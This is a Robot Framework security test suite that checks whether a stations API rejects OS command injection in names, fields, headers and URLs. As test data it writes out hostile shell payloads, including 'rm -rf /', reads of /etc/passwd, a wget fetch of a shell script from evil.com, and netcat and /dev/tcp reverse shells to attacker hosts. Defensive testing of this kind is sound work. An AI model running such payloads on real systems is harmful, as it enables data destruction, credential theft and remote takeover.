*** Settings ***
Documentation       A03: Injection - OS Command Injection Tests
...                 Verifies OS command injection payloads are rejected
Library             Collections
Library             RequestsLibrary
Resource            ../../../resources/common.resource
Resource            ../../../resources/variables.resource
Test Setup          Setup Test Case
Test Teardown       Teardown Test Case

*** Variables ***
@{CMD_INJECTION_PAYLOADS}    ; rm -rf /    | cat /etc/passwd    $(whoami)    `id`    & ping -c 10 attacker.com    | nc attacker.com 4444    && wget http://evil.com/shell.sh    ; bash -i >& /dev/tcp/attacker/4444 0>&1

*** Test Cases ***
TC-CMD-001: Command Injection Via Station Name
    [Documentation]   Verify command injection in station name is rejected
    ${headers}    ${token}=    Authenticate As Regular User
    ${payload}=    Generate Station Payload    name=${CMD_PAYLOAD_1}
    ${response}=    POST    dgsn    /stations    json=${payload}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-CMD-002: Command Injection Via Frequency Field
    [Documentation]   Verify command injection in frequency is rejected
    ${headers}    ${token}=    Authenticate As Regular User
    ${payload}=    Generate Station Payload    frequency_mhz=${CMD_PAYLOAD_2}
    ${response}=    POST    dgsn    /stations    json=${payload}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-CMD-003: Command Injection With Subshell Syntax
    [Documentation]   Verify $(whoami) injection is rejected
    ${headers}    ${token}=    Authenticate As Regular User
    ${payload}=    Generate Station Payload    name=${CMD_PAYLOAD_3}
    ${response}=    POST    dgsn    /stations    json=${payload}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-CMD-004: Backtick Injection In Search
    [Documentation]   Verify backtick command injection is rejected
    ${headers}    ${token}=    Authenticate As Regular User
    ${params}=    Create Dictionary    search=`id`
    ${response}=    GET    dgsn    /stations    headers=${headers}    params=${params}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-CMD-005: Pipe Injection In Username
    [Documentation]   Verify pipe command injection is rejected
    ${headers}=    Create Dictionary    Content-Type=application/json
    ${payload}=    Create Dictionary    username=${CMD_PAYLOAD_2}    password=test
    ${response}=    POST    dgsn    /auth/login    json=${payload}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-CMD-006: Ampersand Injection In Input
    [Documentation]   Verify & command injection is rejected
    ${headers}=    Create Dictionary    Content-Type=application/json
    ${payload}=    Create Dictionary    username=admin&whoami    password=test
    ${response}=    POST    dgsn    /auth/login    json=${payload}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-CMD-007: Newline Injection In Headers
    [Documentation]   Verify newline command injection in headers is rejected
    ${headers}    ${token}=    Authenticate As Regular User
    Set To Dictionary    ${headers}    User-Agent=test\ndig @attacker.com
    ${response}=    GET    dgsn    /stations    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-CMD-008: Chained Command Injection
    [Documentation]   Verify chained command injection is rejected
    ${headers}    ${token}=    Authenticate As Regular User
    ${params}=    Create Dictionary    filter=test && nc -e /bin/sh attacker 4444
    ${response}=    GET    dgsn    /stations    headers=${headers}    params=${params}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-CMD-009: Redirect Injection In Name
    [Documentation]   Verify redirect to /dev/tcp is rejected
    ${headers}    ${token}=    Authenticate As Regular User
    ${payload}=    Generate Station Payload    name=test > /dev/tcp/attacker/9999
    ${response}=    POST    dgsn    /stations    json=${payload}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-CMD-010: Url Command Injection
    [Documentation]   Verify command injection via URL path is rejected
    ${headers}=    Create Dictionary    Content-Type=application/json
    ${response}=    GET    dgsn    /stations/;ls    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_NOT_FOUND}    ${response}
    ${body}=    Set Variable    ${response.text}
    Should Not Contain    ${body}    total

TC-CMD-011: Null Byte Command Injection
    [Documentation]   Verify null byte command injection is rejected
    ${headers}=    Create Dictionary    Content-Type=application/json
    ${payload}=    Create Dictionary    username=admin%00whoami    password=test
    ${response}=    POST    dgsn    /auth/login    json=${payload}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-CMD-012: Nc Reverse Shell Injection
    [Documentation]   Verify netcat reverse shell payload is rejected
    ${headers}    ${token}=    Authenticate As Regular User
    ${payload}=    Generate Station Payload    name=| nc -e /bin/sh attacker 4444
    ${response}=    POST    dgsn    /stations    json=${payload}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

*** Keywords ***
Setup Test Case
    ${timestamp}=    Get Current Date    result_format=epoch
    Set Test Variable    ${TEST_TIMESTAMP}    ${timestamp}

Teardown Test Case
    Log    Command injection test completed at ${TEST_TIMESTAMP}
